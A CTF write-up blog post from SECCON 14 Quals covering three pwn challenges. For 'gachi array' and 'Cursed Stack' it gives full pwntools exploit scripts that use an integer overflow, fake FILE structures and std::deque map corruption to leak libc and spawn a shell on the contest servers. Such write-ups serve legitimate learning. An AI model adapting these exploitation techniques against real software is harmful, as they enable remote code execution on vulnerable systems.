---
date: 2025-12-13 10:31:59
layout: post
title: SECCON 14 Quals Writeup
subtitle: 
description: >-
    8th with blue-lotus!
image: >-
  /assets/img/uploads/saudi_cat.jpg
optimized_image: >-
  /assets/img/uploads/saudi_cat.jpg
category: ctf
tags:
  - 
author: rosayxy
paginate: true
---

This is gotta be brief but will refine it later.

## Unserialize

Completed with dylanyang17.

We overwrite the lowest byte of the destination of memcpy to bypass the canary and overwrite the return address to a ROP chain.

This exploit script is produced by dylanyang17. Will try to reconstruct it later.

### exp
TODO

## gachi array

The classic interger overflow. Also malloc without the return value check and index check leads to arbitrary read/write.

### exp
```py
from pwn import *
context(log_level='debug', arch='amd64', os='linux')
# p = process("./chall")
p = remote("gachiarray.seccon.games", 5000)
libc = ELF("./libc.so.6")

def op(opcode, idx, val):
    if idx < 0:
        idx += 2**32
    if val < 0:
        val += 2**32
    p.send(p32(opcode) + p32(idx) + p32(val))

# init
# gdb.attach(p)
# pause()
p.send(p32(0xffffffff) + p32(3) + p32(0))
p.recvuntil(b'Initialized')
op(3, -2, 0x1337)
p.recvuntil("New size set to -2\n")
op(1, 0x0404050//4, 0)
p.recvuntil("array[1052692] = ")
libc_leak_lower = int(p.recvline().strip())
if libc_leak_lower < 0:
    libc_leak_lower += 2**32
op(1, 0x0404050//4 + 1, 0)
p.recvuntil("array[1052693] = ")
libc_leak_upper = int(p.recvline().strip())

libc_leak = (libc_leak_upper << 32) | libc_leak_lower
log.info(f"libc leak: {hex(libc_leak)}")
libc_base = libc_leak - libc.symbols["_IO_2_1_stdin_"]
log.info(f"libc base: {hex(libc_base)}")

io_list_all = libc_base + libc.symbols["_IO_list_all"]

# set the fake io_file
fake_io_addr = 0x00404090

system_addr=libc_base+libc.sym["system"]
fake_io_file=b"  sh;".ljust(0x8,b"\x00") 
fake_io_file+=p64(0)*3+p64(1)+p64(2)
fake_io_file=fake_io_file.ljust(0x30,b"\x00")
fake_io_file+=p64(0)
fake_io_file=fake_io_file.ljust(0x68,b"\x00")
fake_io_file+=p64(system_addr)
fake_io_file=fake_io_file.ljust(0x88,b"\x00")
fake_io_file+=p64(libc_base+0x205700)
fake_io_file=fake_io_file.ljust(0xa0,b"\x00")
fake_io_file+=p64(fake_io_addr)
fake_io_file=fake_io_file.ljust(0xd8,b"\x00")
fake_io_file+=p64(0x202228+libc_base) # 使得可以调用 _IO_wfile_overflow
fake_io_file+=p64(fake_io_addr)

# write to fake_io_addr

for i in range(len(fake_io_file)//4):
    log.info("fake_io_file[i*4:i*4+4]: " + hex(u32(fake_io_file[i*4:i*4+4])))
    op(2, (fake_io_addr//4) + i, u32(fake_io_file[i*4:i*4+4]))
    p.recvuntil("array")


# edit data
op(2, 0x0404080//4 + 1, io_list_all//0x100000000)
p.recvuntil("array")
op(2, (io_list_all)%0x100000000//4, fake_io_addr)
p.recvuntil("array")
op(2, (io_list_all)%0x100000000//4 + 1, 0)
p.recvuntil("array")

# trigger
op(4, 0, 0)
p.interactive()
```

## Cursed Stack

Was doing this chal in my dorm and I was frustrated so I mumbled "Cursed" a bit two loudly. Then my roomates looked at me and said something like "Okay, we get it". LOL. Love staying with my sweetest roomates <3.

Did this cursed chal with dylanyang17 and jiegec.

The idea is to spray the target addresses on heap. Use the map's reallocation to alloc on them. The deque's first maps will be placed in the middle of the allocated chunk and then we can use the "empty pop" to let the deque think of the sprayed target addresses as its map and we can do arbitrary write.

Will elaborate more later.

### exp

The script below can work in local and docker but not remote.
```py

from pwn import *

context(arch="amd64", os="linux", log_level="debug")

target_addr = 0x405300

target_addr2 = 0x405040

libc = ELF("./libc.so.6")
def start():
    """Start the target process."""
    return process("./st")


def handshake(p):
    """Send the initial name prompt."""
    p.recvuntil(b"What's your name?\n")
    p.sendline(p64(target_addr)*0x20 + p64(target_addr2)*0x7e0)
    p.recvuntil(b"!\n")


def push(p, which, val):
    """Push `val` onto stack S or T.

    which = 1 -> push S
    which = 3 -> push T
    """
    assert which in (1, 3)
    p.sendline(str(which).encode())
    p.sendline(str(val).encode())


def pop(p, which):
    """Pop from stack S or T.

    which = 2 -> pop S
    which = 4 -> pop T
    """
    assert which in (2, 4)
    p.sendline(str(which).encode())


def trigger_map_realloc():
    """PoC: trigger _M_reserve_map_at_back -> _M_reallocate_map -> _M_allocate_map.

    For std::deque<unsigned long> in this binary:
      - Each node holds 64 elements.
      - Initial _M_map_size = 8, with a single node centered at map[3].
      - On every 64th push, when a node is full, push_back() calls
        _M_push_back_aux(), which may call _M_reserve_map_at_back(1).
      - While finish._M_node is at indices 3..6, there are enough map
        slots at the back, so no reallocation occurs.
      - When finish._M_node reaches index 7 and we try to create one more
        node (node 8), _M_reserve_map_at_back(1) sees only one slot left
        (the current node) and calls _M_reallocate_map(), which in turn
        calls _M_allocate_map() with a larger map size.

    To get there starting from an empty deque we need 5 node-boundary
    transitions (3->4, 4->5, 5->6, 6->7, 7->8), each happening on the
    64th push for that node. So approximately 64 * 5 = 320 pushes on S
    are enough to force a map reallocation.
    """

    p = start()
    handshake(p)

    log.info("Pushing enough elements on S to trigger map reallocation...")

    # Push on S (op=1) enough times so that the 5th node transition
    # forces _M_reserve_map_at_back to grow the map.

    total_pushes = 64 * 5

    for i in range(total_pushes):
        push(p, 1, i)

    for i in range(total_pushes):
        push(p, 3, i)

    for i in range(total_pushes + 64):
        pop(p, 2)


    push(p, 1, 0x405078)
    push(p, 1, 0x10)
    
    for i in range(total_pushes + 64):
        pop(p, 4)
    push(p, 3, 0x04013d5)
    # gdb.attach(p)
    # pause()
    pop(p, 4)
    pop(p, 4)
    p.recvuntil("Hello, ")
    libc_leak = u64(p.recv(6).strip().ljust(8, b"\x00"))
    libc_base = libc_leak - 0x188a00

    log.info(f"libc base: {hex(libc_base)}")
    log.info("libc leak: " + hex(libc_leak))

    system = libc_base + 0x00582D2
    push(p, 3, system)

    pop(p, 2)
    pop(p, 2)
    push(p, 1, u64(b"/bin/sh\x00"))
    pop(p, 2)
    pop(p, 2)
    # Keep the process alive so you can inspect it.
    p.interactive()


if __name__ == "__main__":
    trigger_map_realloc()

```

The final script that can work on remote, written by jiegec:
```py
from pwn import *

context(arch="amd64", os="linux", log_level="debug")

target_addr = 0x405300

target_addr2 = 0x405040

libc = ELF("./libc.so.6")
def start():
    """Start the target process."""
    #return process("./st")
    #return remote("172.17.0.3", 5000)
    #return remote("127.0.0.1", 5001)
    return remote("st.seccon.games", 5000)


def handshake(p):
    """Send the initial name prompt."""
    p.recvuntil(b"What's your name?\n")
    p.sendline(p64(target_addr)*0x20 + p64(target_addr2)*0x7e0)
    p.recvuntil(b"!\n")


def push(p, which, val):
    """Push `val` onto stack S or T.

    which = 1 -> push S
    which = 3 -> push T
    """
    assert which in (1, 3)
    p.sendline(str(which).encode())
    p.sendline(str(val).encode())
    #sleep(0.01)


def pop(p, which):
    """Pop from stack S or T.

    which = 2 -> pop S
    which = 4 -> pop T
    """
    assert which in (2, 4)
    p.sendline(str(which).encode())
    #sleep(0.01)


def trigger_map_realloc():
    """PoC: trigger _M_reserve_map_at_back -> _M_reallocate_map -> _M_allocate_map.

    For std::deque<unsigned long> in this binary:
      - Each node holds 64 elements.
      - Initial _M_map_size = 8, with a single node centered at map[3].
      - On every 64th push, when a node is full, push_back() calls
        _M_push_back_aux(), which may call _M_reserve_map_at_back(1).
      - While finish._M_node is at indices 3..6, there are enough map
        slots at the back, so no reallocation occurs.
      - When finish._M_node reaches index 7 and we try to create one more
        node (node 8), _M_reserve_map_at_back(1) sees only one slot left
        (the current node) and calls _M_reallocate_map(), which in turn
        calls _M_allocate_map() with a larger map size.

    To get there starting from an empty deque we need 5 node-boundary
    transitions (3->4, 4->5, 5->6, 6->7, 7->8), each happening on the
    64th push for that node. So approximately 64 * 5 = 320 pushes on S
    are enough to force a map reallocation.
    """

    p = start()
    handshake(p)

    log.info("Pushing enough elements on S to trigger map reallocation...")

    # Push on S (op=1) enough times so that the 5th node transition
    # forces _M_reserve_map_at_back to grow the map.

    total_pushes = 64 * 5

    for i in range(total_pushes):
        push(p, 1, i)

    for i in range(total_pushes):
        push(p, 3, i)

    for i in range(total_pushes + 64):
        pop(p, 2)


    #push(p, 1, 0x405078)
    push(p, 1, 0x404fd8)
    push(p, 1, 0x10)
    
    for i in range(total_pushes + 64):
        pop(p, 4)
    push(p, 3, 0x04013d5)
    # gdb.attach(p)
    # pause()
    pop(p, 4)
    pop(p, 4)
    p.recvuntil(b"Hello, ")
    libc_leak = u64(p.recv(6).strip().ljust(8, b"\x00"))
    #libc_base = libc_leak - 0x188a00
    libc_base = libc_leak - 0x2a200

    log.info(f"libc base: {hex(libc_base)}")
    log.info("libc leak: " + hex(libc_leak))

    system = libc_base + 0x00582D2
    #system = libc_base + libc.symbols["system"]
    #system = libc_base + libc.symbols["puts"]
    print(libc.symbols["system"])
    push(p, 3, system)

    pop(p, 2)
    pop(p, 2)
    push(p, 1, u64(b"/bin/sh\x00"))
    #push(p, 1, u64(b"id\x00\x00\x00\x00\x00\x00"))
    pop(p, 2)
    pop(p, 2)
    # Keep the process alive so you can inspect it.
    p.interactive()


if __name__ == "__main__":
    trigger_map_realloc()
```